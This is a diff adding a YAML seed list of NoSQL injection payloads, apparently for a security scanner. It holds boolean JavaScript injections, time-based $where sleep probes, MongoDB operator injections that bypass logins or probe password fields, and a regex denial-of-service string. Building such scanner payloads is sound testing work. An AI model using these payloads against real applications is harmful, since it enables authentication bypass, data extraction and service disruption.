@@ -1,0 +1,53 @@
+# NoSQLi payload expansion: more operators, expression/$expr, text search
+seeds:
+  nosqli:
+    boolean:
+      - raw: "' || '1'=='1' //"
+        ctx: ["string"]
+      - raw: "' || 1==1 //"
+        ctx: ["string"]
+      - raw: "admin' || '1'=='1' //"
+        ctx: ["string"]
+      - raw: "' && this.password.match(/.*/) //"
+        ctx: ["string"]
+    where_time:
+      - raw: "'; if (1==1) { sleep(3000); } //"
+        threshold: 2.5
+        ctx: ["string"]
+    json:
+      - raw: '{"$expr": {"$eq": ["1", "$$ROOT.password"]}}'
+        type: "json"
+        ctx: ["json"]
+      - raw: '{"$expr": {"$gt": [1, 0]}}'
+        type: "json"
+        ctx: ["json"]
+      - raw: '{"$expr": {"$ne": ["", "$$ROOT.username"]}}'
+        type: "json"
+        ctx: ["json"]
+      - raw: '{"$text": {"$search": "admin"}}'
+        type: "json"
+        ctx: ["json"]
+      - raw: '{"$jsonSchema": {"required": ["__proto__"]}}'
+        type: "json"
+        ctx: ["json"]
+      - raw: '{"$where": "sleep(5000)"}'
+        type: "json_time"
+        ctx: ["json"]
+      - raw: '{"$regex": "^(?=.*a)(?=.*b)(?=.*c)(?=.*d)(?=.*e)(?=.*f)(?=.*g)(?=.*h)(?=.*i)(?=.*j).*$"}'
+        type: "redos"
+        ctx: ["json"]
+      - raw: '{"$ne": null}'
+        type: "json"
+        ctx: ["json"]
+      - raw: '{"$in": [""]}'
+        type: "json"
+        ctx: ["json"]
+      - raw: '{"$exists": true}'
+        type: "json"
+        ctx: ["json"]
+      - raw: '{"$or": [{"a": {"$ne": 1}}, {"b": 1}]}'
+        type: "json"
+        ctx: ["json"]
+      - raw: '{"$and": [{"a": {"$ne": 1}}, {"b": 1}]}'
+        type: "json"
+        ctx: ["json"]
